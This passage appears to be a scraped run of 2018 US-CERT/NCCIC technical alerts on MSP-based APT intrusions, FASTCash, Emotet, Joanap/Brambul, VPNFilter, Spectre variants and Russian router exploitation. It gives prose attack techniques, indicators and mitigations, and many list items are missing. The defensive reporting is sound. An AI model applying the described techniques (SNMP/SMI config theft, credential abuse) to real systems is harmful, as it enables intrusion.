blocked because they are legitimate tools, so APT actors can use them and remain undetected on victim networks. Although network defenders can generate log files, APT actors’ use of legitimate scripts makes it difficult to identify system anomalies and other malicious activity.When APT actors use system tools and common cloud services, it can also be difficult for network defenders to detect data exfiltration. APT actors have been observed using Robocopy—a Microsoft command line tool—to transfer exfiltrated and archived data from MSP client networks back through MSP network environments. Additionally, APT actors have been observed using legitimate PuTTY Secure Copy Client functions, allowing them to transfer stolen data securely and directly to third-party systems.A successful network intrusion can have severe impacts to the affected organization, particularly if the compromise becomes public. Possible impacts includeOrganizations should configure system logs to detect incidents and to identify the type and scope of malicious activity. Properly configured logs enable rapid containment and appropriate response.An organization’s ability to rapidly respond to and recover from an incident begins with the development of an incident response capability. An organization’s response capability should focus on being prepared to handle the most common attack vectors (e.g., spearphishing, malicious web content, credential theft). In general, organizations should prepare byMSP clients that do not conduct the majority of their own network defense should work with their MSP to determine what they can expect in terms of security. MSP clients should understand the supply chain risk associated with their MSP. Organizations should manage risk equally across their security, legal, and procurement groups. MSP clients should also refer to cloud security guidance from the National Institute of Standards and Technology to learn about MSP terms of service, architecture, security controls, and risks associated with cloud computing and data protection.[1] [2] [3]Restricting access to networks and systems is critical to containing an APT actor’s movement. Provided below are key items that organizations should implement and periodically audit to ensure their network environment’s physical and logical architecture limits an APT actor’s visibility and access.Virtual Private Network Connection RecommendationsNetwork Architecture RecommendationsNetwork Service Restriction RecommendationsCompromised account credentials continue to be the number one way threat actors are able to penetrate a network environment. The accounts organizations create for MSPs increase the risk of credential compromise, as MSP accounts typically require elevated access. It is important organizations’ adhere to best practices for password and permission management, as this can severely limit a threat actor’s ability to access and move laterally across a network. Provided below are key items organizations should implement and routinely audit to ensure these risks are mitigated.Account Configuration RecommendationsLogging Configuration RecommendationsBuilding a sound architecture supported by strong technical controls is only the first part to protecting a network environment. It is just as critical that organizations continuously monitor their systems, update configurations to reflect changes in their network environment, and maintain relationships with MSPs. Listed below are key operational controls organizations should incorporate for protection from threats.Operational Control RecommendationsIt is important to note that—while the recommendations provided in this TA aim at preventing the initial attack vectors and the spread of any malicious activity—there is no single solution to protecting and defending a network. NCCIC recommends network defenders use a defense-in-depth strategy to increase the odds of successfully identifying an intrusion, stopping malware, and disrupting threat actor activity. The goal is to make it as difficult as possible for an attacker to be successful and to force them to use methods that are easier to detect with higher operational costs.Contact DHS or your local FBI office immediately. To report an intrusion and request resources for incident response or technical assistance, contact NCCIC at (NCCICCustomerService@hq.dhs.gov or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).This product is provided subject to this Notification and this Privacy & Use policy.Network SystemsThis technical alert addresses the exploitation of trusted network relationships and the subsequent illicit use of legitimate credentials by Advanced Persistent Threat (APT) actors. It identifies APT actors' tactics, techniques, and procedures (TTPs) and describes the best practices that could be employed to mitigate each of them. The mitigations for each TTP are arranged according to the National Institute of Standards and Technology (NIST) Cybersecurity Framework core functions of Protect, Detect, Respond, and Recover.APT actors are using multiple mechanisms to acquire legitimate user credentials to exploit trusted network relationships in order to expand unauthorized access, maintain persistence, and exfiltrate data from targeted organizations. Suggested best practices for administrators to mitigate this threat include auditing credentials, remote-access logs, and controlling privileged access and remote access.APT actors are conducting malicious activity against organizations that have trusted network relationships with potential targets, such as a parent company, a connected partner, or a contracted managed service provider (MSP). APT actors can use legitimate credentials to expand unauthorized access, maintain persistence, exfiltrate data, and conduct other operations, while appearing to be authorized users. Leveraging legitimate credentials to exploit trusted network relationships also allows APT actors to access other devices and other trusted networks, which affords intrusions a high level of persistence and stealth.Recommended best practices for mitigating this threat include rigorous credential and privileged-access management, as well as remote-access control, and audits of legitimate remote-access logs. While these measures aim to prevent the initial attack vectors and the spread of malicious activity, there is no single proven threat response.Using a defense-in-depth strategy is likely to increase the odds of successfully disrupting adversarial objectives long enough to allow network defenders to detect and respond before the successful completion of a threat actor’s objectives.Any organization that uses an MSP to provide services should monitor the MSP's interactions within their organization’s enterprise networks, such as account use, privileges, and access to confidential or proprietary information. Organizations should also ensure that they have the ability to review their security and monitor their information hosted on MSP networks.The following table displays the TTPs employed by APT actors and pairs them with mitigations that network defenders can implement.Protect:Detect:Protect:Detect:Respond and Recover:Execution and Internal Reconnaissance:Lateral Movement:Credential Access:Protect:Detect:Respond and Recover:Protect:Detect:Compromising the credentials of legitimate users automatically provides a threat actor access to the network resources available to those users and helps that threat actor move more covertly through the network. Adopting and enforcing a strong-password policy can reduce a threat actor’s ability to compromise legitimate accounts; transitioning to multifactor authentication solutions increases the difficulty even further. Additionally, monitoring user account logins—whether failed or successful—and deploying tools and services to detect illicit use of credentials can help network defenders identify potentially malicious activity.Threat actors regularly target privileged accounts because they not only grant increased access to high-value assets in the network, but also more easily enable lateral movement, and often provide mechanisms for the actors to hide their activities. Privileged access can be controlled by ensuring that only those users requiring elevated privileges are granted those accesses and, in accordance with the principle of least privilege, by restricting the use of those privileged accounts to instances where elevated privileges are required for specific tasks. It is also important to carefully manage and monitor local-administrator and MSP accounts because they inherently function with elevated privileges and are often ignored after initial configuration.A key way to control privileged accounts is to segregate and control administrator (admin) privileges. All administrative credentials should be tightly controlled, restricted to a function, or even limited to a specific amount of time. For example, only dedicated workstation administrator accounts should be able to administer workstations. Server accounts, such as general, Structured Query Language, or email admins, should not have administrative access to workstations. The only place domain administrator (DA) or enterprise administrator (EA) credentials should ever be used is on a domain controller. Both EA and DA accounts should be removed from the local-administrators group on all other devices. On UNIX devices, sudo (or root) access should be tightly restricted in the same manner. Employing a multifactor authentication solution for admin accounts adds another layer of security and can significantly reduce the impact of a password compromise because the threat actor needs the other factor—that is, a smartcard or a token—for authentication.Additionally, administrators should disable unencrypted remote-administrative protocols and services, which are often enabled by default. Protocols required for operations must be authorized, and the most secure version must be implemented. All other protocols must be disabled, particularly unencrypted remote-administrative protocols used to manage network infrastructure devices, such as Telnet, Hypertext Transfer Protocol, File Transfer Protocol, Trivial File Transfer Protocol, and Simple Network Management Protocol versions 1 and 2.Contact DHS or your local FBI office immediately. To report an intrusion and request resources for incident response or technical assistance, contact NCCIC at (NCCICCustomerService@hq.dhs.gov or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).This product is provided subject to this Notification and this Privacy & Use policy.Retail Payment SystemsThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS), the Department of the Treasury (Treasury), and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS, Treasury, and FBI identified malware and other indicators of compromise (IOCs) used by the North Korean government in an Automated Teller Machine (ATM) cash-out scheme—referred to by the U.S. Government as “FASTCash.” The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.gov/hiddencobra.FBI has high confidence that HIDDEN COBRA actors are using the IOCs listed in this report to maintain a presence on victims’ networks to enable network exploitation. DHS, FBI, and Treasury are distributing these IOCs to enable network defense and reduce exposure to North Korean government malicious cyber activity.This TA also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the malware families associated with FASTCash, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.NCCIC conducted analysis on 10 malware samples related to this activity and produced a Malware Analysis Report (MAR). MAR-10201537 – HIDDEN COBRA FASTCash-Related Malware examines the tactics, techniques, and procedures observed in the malware. Visit the MAR-10201537 page for the report and associated IOCs.Since at least late 2016, HIDDEN COBRA actors have used FASTCash tactics to target banks in Africa and Asia. At the time of this TA’s publication, the U.S. Government has not confirmed any FASTCash incidents affecting institutions within the United States.FASTCash schemes remotely compromise payment switch application servers within banks to facilitate fraudulent transactions. The U.S. Government assesses that HIDDEN COBRA actors will continue to use FASTCash tactics to target retail payment systems vulnerable to remote exploitation.According to a trusted partner’s estimation, HIDDEN COBRA actors have stolen tens of millions of dollars. In one incident in 2017, HIDDEN COBRA actors enabled cash to be simultaneously withdrawn from ATMs located in over 30 different countries. In another incident in 2018, HIDDEN COBRA actors enabled cash to be simultaneously withdrawn from ATMs in 23 different countries.  HIDDEN COBRA actors target the retail payment system infrastructure within banks to enable fraudulent ATM cash withdrawals across national borders. HIDDEN COBRA actors have configured and deployed legitimate scripts on compromised switch application servers in order to intercept and reply to financial request messages with fraudulent but legitimate-looking affirmative response messages. Although the infection vector is unknown, all of the compromised switch application servers were running unsupported IBM Advanced Interactive eXecutive (AIX) operating system versions beyond the end of their service pack support dates; there is no evidence HIDDEN COBRA actors successfully exploited the AIX operating system in these incidents.HIDDEN COBRA actors exploited the targeted systems by using their knowledge of International Standards Organization (ISO) 8583—the standard for financial transaction messaging—and other tactics. HIDDEN COBRA actors most likely deployed ISO 8583 libraries on the targeted switch application servers. Malicious threat actors use these libraries to help interpret financial request messages and properly construct fraudulent financial response messages.Figure 1: Anatomy of a FASTCash schemeA review of log files showed HIDDEN COBRA actors making typos and actively correcting errors while configuring the targeted server for unauthorized activity. Based on analysis of the affected systems, analysts believe that the scripts —used by HIDDEN COBRA actors and explained in the Technical Details section below—inspected inbound financial request messages for specific primary account numbers (PANs). The scripts generated fraudulent financial response messages only for the request messages that matched the expected PANs. Most accounts used to initiate the transactions had minimal account activity or zero balances.Analysts believe HIDDEN COBRA actors blocked transaction messages to stop denial messages from leaving the switch and used a GenerateResponse* function to approve the transactions. These response messages were likely sent for specific PANs matched using CheckPan()verification (see figure 1 for additional details on CheckPan()).HIDDEN COBRA actors used malicious Windows executable applications, command-line utility applications, and other files in the FASTCash campaign to perform transactions and interact with financial systems, including the switch application server. The initial infection vector used to compromise victim networks is unknown; however, analysts surmise HIDDEN COBRA actors used spear-phishing emails in targeted attacks against bank employees. HIDDEN COBRA actors likely used Windows-based malware to explore a bank’s network to identify the payment switch application server. Although these threat actors used different malware in each known incident, static analysis of malware samples indicates similarities in malware capabilities and functionalities.HIDDEN COBRA actors likely used legitimate credentials to move laterally through a bank’s network and to illicitly access the switch application server. This pattern suggests compromised systems within a bank’s network were used to access and compromise the targeted payment switch application server.Although some of the files used by HIDDEN COBRA actors were legitimate, and not inherently malicious, it is likely that HIDDEN COBRA actors used these legitimate files for malicious purposes. See MAR-10201537 for details on the files used. Malware samples obtained for analysis included AIX executable files intended for a proprietary UNIX operating system developed by IBM. The IBM AIX executable files were designed to conduct code injection and inject a library into a currently running process. One of the sample AIX executables obtained provides export functions, which allows an application to perform transactions on financial systems using the ISO 8583 standard.Upon successful compromise of a bank’s payment switch application server, HIDDEN COBRA actors likely deployed legitimate scripts—using command-line utility applications on the payment switch application server—to enable fraudulent behavior by the system in response to what would otherwise be normal payment switch application server activity. Figure 1 depicts the pattern of fraudulent behavior. The scripts alter the expected behavior of the server by targeting the business process, rather than exploiting a technical process. During analysis of log files associated with known FASTCash incidents, analysts identified the following commonalities:Additionally, both commands use either the inject (mode 0) or eject (mode 1) argument with the following ISO 8583 libraries:NCCIC recommends administrators review bash history logs of all users with root privileges. Administrators can find commands entered by users in the bash history logs; these would indicate the execution of scripts on the switch application server. Administrators should log and monitor all commands.The U.S. Government recommends that network administrators review MAR-10201537 for IOCs related to the HIDDEN COBRA FASTCash campaign, identify whether any of the provided IOCs fall within their organization’s network, and—if found—take necessary measures to remove the malware.A successful network intrusion can have severe impacts, particularly if the compromise becomes public. Possible impacts to the affected organization includeRequire Chip and Personal Identification Number Cryptogram ValidationIsolate Payment System InfrastructureLogically Segregate Operating EnvironmentsEncrypt Data in TransitMonitor for Anomalous Behavior as Part of Layered SecurityRecommendations for Organizations with ATM or Point-of-Sale DevicesNCCIC encourages users and administrators to use the following best practices to strengthen the security posture of their organization’s systems:For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology (NIST) Special Publication (SP) 800-83: Guide to Malware Incident Prevention and Handling for Desktops and Laptops.[1]Contact DHS or your local FBI office immediately. To report an intrusion and request resources for incident response or technical assistance, contact NCCIC at (NCCICCustomerService@hq.dhs.gov or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).This product is provided subject to this Notification and this Privacy & Use policy.Network SystemsEmotet is an advanced, modular banking Trojan that primarily functions as a downloader or dropper of other banking Trojans. Emotet continues to be among the most costly and destructive malware affecting state, local, tribal, and territorial (SLTT) governments, and the private and public sectors.This joint Technical Alert (TA) is the result of Multi-State Information Sharing & Analysis Center (MS-ISAC) analytic efforts, in coordination with the Department of Homeland Security (DHS) National Cybersecurity and Communications Integration Center (NCCIC).Emotet continues to be among the most costly and destructive malware affecting SLTT governments. Its worm-like features result in rapidly spreading network-wide infection, which are difficult to combat. Emotet infections have cost SLTT governments up to $1 million per incident to remediate.Emotet is an advanced, modular banking Trojan that primarily functions as a downloader or dropper of other banking Trojans. Additionally, Emotet is a polymorphic banking Trojan that can evade typical signature-based detection. It has several methods for maintaining persistence, including auto-start registry keys and services. It uses modular Dynamic Link Libraries (DLLs) to continuously evolve and update its capabilities. Furthermore, Emotet is Virtual Machine-aware and can generate false indicators if run in a virtual environment.Emotet is disseminated through malspam (emails containing malicious attachments or links) that uses branding familiar to the recipient; it has even been spread using the MS-ISAC name. As of July 2018, the most recent campaigns imitate PayPal receipts, shipping notifications, or “past-due” invoices purportedly from MS-ISAC. Initial infection occurs when a user opens or clicks the malicious download link, PDF, or macro-enabled Microsoft Word document included in the malspam. Once downloaded, Emotet establishes persistence and attempts to propagate the local networks through incorporated spreader modules.Currently, Emotet uses five known spreader modules: NetPass.exe, WebBrowserPassView, Mail PassView, Outlook scraper, and a credential enumerator.To maintain persistence, Emotet injects code into explorer.exe and other running processes. It can also collect sensitive information, including system name, location, and operating system version, and connects to a remote command and control server (C2), usually through a generated 16-letter domain name that ends in “.eu.” Once Emotet establishes a connection with the C2, it reports a new infection, receives configuration data, downloads and runs files, receives instructions, and uploads data to the C2 server.Emotet artifacts are typically found in arbitrary paths located off of the AppData\Local and AppData\Roaming directories. The artifacts usually mimic the names of known executables. Persistence is typically maintained through Scheduled Tasks or via registry keys. Additionally, Emotet creates randomly-named files in the system root directories that are run as Windows services. When executed, these services attempt to propagate the malware to adjacent systems via accessible administrative shares.Note: it is essential that privileged accounts are not used to log in to compromised systems during remediation as this may accelerate the spread of the malware.Example Filenames and Paths:C:\Users\<username>\AppData \Local\Microsoft\Windows\shedaudio.exeC:\Users\<username>\AppData\Roaming\Macromedia\Flash Player\macromedia\bin\flashplayer.exeTypical Registry Keys:HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunSystem Root Directories:C:\Windows\11987416.exeC:\Windows\System32\46615275.exeC:\Windows\System32\shedaudio.exeC:\Windows\SysWOW64\f9jwqSbS.exeNegative consequences of Emotet infection includeNCCIC and MS-ISAC recommend that organizations adhere to the following general best practices to limit the effect of Emotet and similar malspam:If a user or organization believes they may be infected, NCCIC and MS-ISAC recommend running an antivirus scan on the system and taking action to isolate the infected workstation based on the results. If multiple workstations are infected, the following actions are recommended:MS-ISAC is the focal point for cyber threat prevention, protection, response, and recovery for the nation’s SLTT governments. More information about this topic, as well as 24/7 cybersecurity assistance for SLTT governments, is available by phone at 866-787-4722, by email at SOC@cisecurity.org, or on MS-ISAC’s website at https://msisac.cisecurity.org/.To report an intrusion and request resources for incident response or technical assistance, contact NCCIC by email at NCCICCustomerService@hq.dhs.gov or by phone at 888-282-0870.This product is provided subject to this Notification and this Privacy & Use policy.Network systemsThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with two families of malware used by the North Korean government:The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.gov/hiddencobra.FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and enable network exploitation. DHS and FBI are distributing these IP addresses and other IOCs to enable network defense and reduce exposure to any North Korean government malicious cyber activity.This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on how to report incidents. If users or administrators detect activity associated with these malware families, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.See the following links for a downloadable copy of IOCs:NCCIC conducted analysis on four malware samples and produced a Malware Analysis Report (MAR). MAR-10135536.3 – RAT/Worm examines the tactics, techniques, and procedures observed in the malware. Visit MAR-10135536.3 – HIDDEN COBRA RAT/Worm for the report and associated IOCs.According to reporting of trusted third parties, HIDDEN COBRA actors have likely been using both Joanap and Brambul malware since at least 2009 to target multiple victims globally and in the United States—including the media, aerospace, financial, and critical infrastructure sectors. Users and administrators should review the information related to Joanap and Brambul from the Operation Blockbuster Destructive Malware Report [1] in conjunction with the IP addresses listed in the .csv and .stix files provided within this alert. Like many of the families of malware used by HIDDEN COBRA actors, Joanap, Brambul, and other previously reported custom malware tools, may be found on compromised network nodes. Each malware tool has different purposes and functionalities.Joanap malware is a fully functional RAT that is able to receive multiple commands, which can be issued by HIDDEN COBRA actors remotely from a command and control server. Joanap typically infects a system as a file dropped by other HIDDEN COBRA malware, which users unknowingly downloaded either when they visit sites compromised by HIDDEN COBRA actors, or when they open malicious email attachments.During analysis of the infrastructure used by Joanap malware, the U.S. Government identified 87 compromised network nodes. The countries in which the infected IP addresses are registered are as follows:Malware often infects servers and systems without the knowledge of system users and owners. If the malware can establish persistence, it could move laterally through a victim’s network and any connected networks to infect nodes beyond those identified in this alert.Brambul malware is a brute-force authentication worm that spreads through SMB shares. SMBs enable shared access to files between users on a network. Brambul malware typically spreads by using a list of hard-coded login credentials to launch a brute-force password attack against an SMB protocol for access to a victim’s networks.Technical DetailsJoanapJoanap is a two-stage malware used to establish peer-to-peer communications and to manage botnets designed to enable other operations. Joanap malware provides HIDDEN COBRA actors with the ability to exfiltrate data, drop and run secondary payloads, and initialize proxy communications on a compromised Windows device. Other notable functions includeAnalysis indicates the malware encodes data using Rivest Cipher 4 encryption to protect its communication with HIDDEN COBRA actors. Once installed, the malware creates a log entry within the Windows System Directory in a file named mssscardprv.ax. HIDDEN COBRA actors use this file to capture and store victims’ information such as the host IP address, host name, and the current system time.BrambulBrambul malware is a malicious Windows 32-bit SMB worm that functions as a service dynamic link library file or a portable executable file often dropped and installed onto victims’ networks by dropper malware. When executed, the malware attempts to establish contact with victim systems and IP addresses on victims’ local subnets. If successful, the application attempts to gain unauthorized access via the SMB protocol (ports 139 and 445) by launching brute-force password attacks using a list of embedded passwords. Additionally, the malware generates random IP addresses for further attacks.Analysts suspect the malware targets insecure or unsecured user accounts and spreads through poorly secured network shares. Once the malware establishes unauthorized access on the victim’s systems, it communicates information about victim’s systems to HIDDEN COBRA actors using malicious email addresses. This information includes the IP address and host name—as well as the username and password—of each victim’s system. HIDDEN COBRA actors can use this information to remotely access a compromised system via the SMB protocol.Analysis of a newer variant of Brambul malware identified the following built-in functions for remote operations:Detection and ResponseThis alert’s IOC files provide HIDDEN COBRA IOCs related to Joanap and Brambul. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.A successful network intrusion can have severe impacts, particularly if the compromise becomes public. Possible impacts includeMitigation StrategiesDHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:Response to Unauthorized Network AccessContact DHS or your local FBI office immediately. To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), FBI through a local field office, or FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).This product is provided subject to this Notification and this Privacy & Use policy.Cybersecurity researchers have identified that foreign cyber actors have compromised hundreds of thousands of home and office routers and other networked devices worldwide [1] [2] [3]. The actors used VPNFilter malware to target small office/home office (SOHO) routers. VPNFilter malware uses modular functionality to collect intelligence, exploit local area network (LAN) devices, and block actor-configurable network traffic. Specific characteristics of VPNFilter have only been observed in the BlackEnergy malware, specifically BlackEnergy versions 2 and 3.The Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) recommend that owners of SOHO routers power cycle (reboot) SOHO routers and networked devices to temporarily disrupt the malware.DHS and FBI encourage SOHO router owners to report information concerning suspicious or criminal activity to their local FBI field office or the FBI’s 24/7 Cyber Watch (CyWatch). Field office contacts can be identified at www.fbi.gov/contact-us/field. CyWatch can be contacted by phone at 855-292-3937 or by email at CyWatch@fbi.gov. Each submitted report should include as much informaiton as possible, specifically the date, time, location, type of activity, number of people, the type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact.The size and scope of this infrastructure impacted by VPNFilter malware is significant. The persistent VPNFilter malware linked to this infrastructure targets a variety of SOHO routers and network-attached storage devices. The initial exploit vector for this malware is currently unknown.The malware uses a modular functionality on SOHO routers to collect intelligence, exploit LAN devices, and block actor-configurable network traffic. The malware can render a device inoperable, and has destructive functionality across routers, network-attached storage devices, and central processing unit (CPU) architectures running embedded Linux. The command and control mechanism implemented by the malware uses a combination of secure sockets layer (SSL) with client-side certificates for authentication and TOR protocols, complicating network traffic detection and analysis.Negative consequences of VPNFilter malware infection include:DHS and FBI recommend that all SOHO router owners power cycle (reboot) their devices to temporarily disrupt the malware.Network device management interfaces—such as Telnet, SSH, Winbox, and HTTP—should be turned off for wide-area network (WAN) interfaces, and, when enabled, secured with strong passwords and encryption. Network devices should be upgraded to the latest available versions of firmware, which often contain patches for vulnerabilities.Rebooting affected devices will cause non-persistent portions of the malware to be removed from the system. Network defenders should ensure that first-stage malware is removed from the devices, and appropriate network-level blocking is in place prior to rebooting affected devices. This will ensure that second stage malware is not downloaded again after reboot.While the paths at each stage of the malware can vary across device platforms, processes running with the name "vpnfilter" are almost certainly instances of the second stage malware. Terminating these processes and removing associated processes and persistent files that execute the second stage malware would likely remove this malware from targeted devices.This product is provided subject to this Notification and this Privacy & Use policy.CPU hardware implementationsOn May 21, 2018, new variants of the side-channel central processing unit (CPU) hardware vulnerabilities known as Spectre and Meltdown were publicly disclosed. These variants—known as 3A and 4—can allow an attacker to obtain access to sensitive information on affected systems.Common CPU hardware implementations are vulnerable to the side-channel attacks known as Spectre and Meltdown. Meltdown is a bug that "melts" the security boundaries normally enforced by the hardware, affecting desktops, laptops, and cloud computers. Spectre is a flaw that an attacker can exploit to force a CPU to reveal its data.Variant 3a is a vulnerability that may allow an attacker with local access to speculatively read system parameters via side-channel analysis and obtain sensitive information.Variant 4 is a vulnerability that exploits “speculative bypass.” When exploited, Variant 4 could allow an attacker to read older memory values in a CPU’s stack or other memory locations. While implementation is complex, this side-channel vulnerability could allow less privileged code toCorresponding CVEs for Side-Channel Variants 1, 2, 3, 3a, and 4 are found below:Side-Channel Vulnerability Variants 3a and 4 may allow an attacker to obtain access to sensitive information on affected systems.NCCIC recommends users and administratorsThe following table contains links to advisories and patches published in response to the vulnerabilities. This table will be updated as information becomes available.This product is provided subject to this Notification and this Privacy & Use policy.Update: On April 19, 2018, an industry partner notified NCCIC and the FBI of malicious cyber activity that aligns with the techniques, tactics, and procedures (TTPs) and network indicators listed in this Alert. Specifically, the industry partner reported the actors redirected DNS queries to their own infrastructure by creating GRE tunnels and obtained sensitive information, which include the configuration files of networked devices.NCCIC encourages organizations to use the detection and prevention guidelines outlined in this Alert to help defend against this activity. For instance, administrators should inspect the presence of protocol 47 traffic flowing to or from unexpected addresses, or unexplained presence of GRE tunnel creation, modification, or destruction in log files.Original Post: This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS), the Federal Bureau of Investigation (FBI), and the United Kingdom’s National Cyber Security Centre (NCSC). This TA provides information on the worldwide cyber exploitation of network infrastructure devices (e.g., router, switch, firewall, Network-based Intrusion Detection System (NIDS) devices) by Russian state-sponsored cyber actors. Targets are primarily government and private-sector organizations, critical infrastructure providers, and the Internet service providers (ISPs) supporting these sectors. This report contains technical details on the tactics, techniques, and procedures (TTPs) used by Russian state-sponsored cyber actors to compromise victims. Victims were identified through a coordinated series of actions between U.S. and international partners. This report builds on previous DHS reporting and advisories from the United Kingdom, Australia, and the European Union. [1-5] This report contains indicators of compromise (IOCs) and contextual information regarding observed behaviors on the networks of compromised victims. FBI has high confidence that Russian state-sponsored cyber actors are using compromised routers to conduct man-in-the-middle attacks to support espionage, extract intellectual property, maintain persistent access to victim networks, and potentially lay a foundation for future offensive operations.DHS, FBI, and NCSC urge readers to act on past alerts and advisories issued by the U.S. and U.K. Governments, allied governments, network device manufacturers, and private-sector security organizations. Elements from these alerts and advisories have been selected and disseminated in a wide variety of security news outlets and social media platforms. The current state of U.S. network devices—coupled with a Russian government campaign to exploit these devices—threatens the safety, security, and economic well-being of the United States.The purpose of this TA is to inform network device vendors, ISPs, public-sector organizations, private-sector corporations, and small office home office (SOHO) customers about the Russian government campaign, provide information to identify malicious activity, and reduce exposure to this activity.For a downloadable copy of the IOC package, see TA18-106A_TLP_WHITE.stix.xml.Since 2015, the U.S. Government received information from multiple sources—including private and public sector cybersecurity research organizations and allies—that cyber actors are exploiting large numbers of enterprise-class and SOHO/residential routers and switches worldwide. The U.S. Government assesses that cyber actors supported by the Russian government carried out this worldwide campaign. These operations enable espionage and intellectual property theft that supports the Russian Federation’s national security and economic goals.Legacy Protocols and Poor Security PracticeRussian cyber actors leverage a number of legacy or weak protocols and service ports associated with network administration activities. Cyber actors use these weaknesses toAdditionally, Russian cyber actors could potentially modify or deny traffic traversing through the router.Russian cyber actors do not need to leverage zero-day vulnerabilities or install malware to exploit these devices. Instead, cyber actors take advantage of the following vulnerabilities:These factors allow for both intermittent and persistent access to both intellectual property and U.S. critical infrastructure that supports the health and safety of the U.S. population.Own the Router, Own the TrafficNetwork devices are ideal targets. Most or all organizational and customer traffic must traverse these critical devices. A malicious actor with presence on an organization’s gateway router has the ability to monitor, modify, and deny traffic to and from the organization. A malicious actor with presence on an organization’s internal routing and switching infrastructure can monitor, modify, and deny traffic to and from key hosts inside the network and leverage trust relationships to conduct lateral movement to other hosts. Organizations that use legacy, unencrypted protocols to manage hosts and services, make successful credential harvesting easy for these actors. An actor controlling a router between Industrial Control Systems – Supervisory Control and Data Acquisition (ICS-SCADA) sensors and controllers in a critical infrastructure—such as the Energy Sector—can manipulate the messages, creating dangerous configurations that could lead to loss of service or physical destruction. Whoever controls the routing infrastructure of a network essentially controls the data flowing through the network.Network Devices—Often Easy TargetsStage 1: ReconnaissanceRussian state-sponsored cyber actors have conducted both broad-scale and targeted scanning of Internet address spaces. Such scanning allows these actors to identify enabled Internet-facing ports and services, conduct device fingerprinting, and discover vulnerable network infrastructure devices. Protocols targeted in this scanning includeLogin banners and other data collected from enabled services can reveal the make and model of the device and information about the organization for future engagement.Device configuration files extracted in previous operations can enhance the reconnaissance effort and allow these actors to refine their methodology.Stage 2: Weaponization and Stage 3: DeliveryCommercial and government security organizations have identified specially crafted SNMP and SMI packets that trigger the scanned device to send its configuration file to a cyber-actor-controlled host via Trivial File Transfer Protocol (TFTP), User Datagram Protocol (UDP) port 69. [6-8] If the targeted network is blocking external SNMP at the network boundary, cyber actors spoof the source address of the SNMP UDP datagram as coming from inside the targeted network. The design of SMI (directors and clients) requires the director and clients to be on the same network. However, since SMI is an unauthenticated protocol, the source address for SMI is also susceptible to spoofing.The configuration file contains a significant amount of information about the scanned device, including password hash values. These values allow cyber actors to derive legitimate credentials. The configuration file also contains SNMP community strings and other network information that allows the cyber actors to build network maps and facilitate future targeted exploitation.Stage 4: ExploitationLegitimate user masquerade is the primary method by which these cyber actors exploit targeted network devices. In some cases, the actors use brute-force attacks to obtain Telnet and SSH login credentials. However, for the most part, cyber actors are able to easily obtain legitimate credentials, which they then use to access routers. Organizations that permit default or commonly used passwords, have weak password policies, or permit passwords that can be derived from credential-harvesting activities, allow cyber actors to easily guess or access legitimate user credentials. Cyber actors can also access legitimate credentials by extracting password hash values from configurations sent by owners and operators across the Internet or by SNMP and SMI scanning.Armed with the legitimate credentials, cyber actors can authenticate into the device as a privileged user via remote management services such as Telnet, SSH, or the web management interface.Stage 5: InstallationSMI is an unauthenticated management protocol developed by Cisco. This protocol supports a feature that allows network administrators to download or overwrite any file on any Cisco router or switch that supports this feature. This feature is designed to enable network administrators to remotely install and configure new devices and install new OS files.On November 18, 2016, a Smart Install Exploitation Tool (SIET) was posted to the Internet. The SIET takes advantage of the unauthenticated SMI design. Commercial and government security organizations have noted that Russian state-sponsored cyber actors have leveraged the SIET to abuse SMI to download current configuration files. Of concern, any actor may leverage this capability to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Additionally, these network devices have writeable file structures where malware for other platforms may be stored to support lateral movement throughout the targeted network.Stage 6: Command and ControlCyber actors masquerade as legitimate users to log into a device or establish a connection via a previously uploaded OS image with a backdoor. Once successfully logged into the device, cyber actors execute privileged commands. These cyber actors create a man-in-the-middle scenario that allows them toAt this stage, cyber actors are not restricted from modifying or denying traffic to and from the victim. Although there are no reports of this activity, it is technically possible.TelnetReview network device logs and netflow data for indications of TCP Telnet-protocol traffic directed at port 23 on all network device hosts. Although Telnet may be directed at other ports (e.g., port 80, HTTP), port 23 is the primary target. Inspect any indication of Telnet sessions (or attempts). Because Telnet is an unencrypted protocol, session traffic will reveal command line interface (CLI) command sequences appropriate for the make and model of the device. CLI 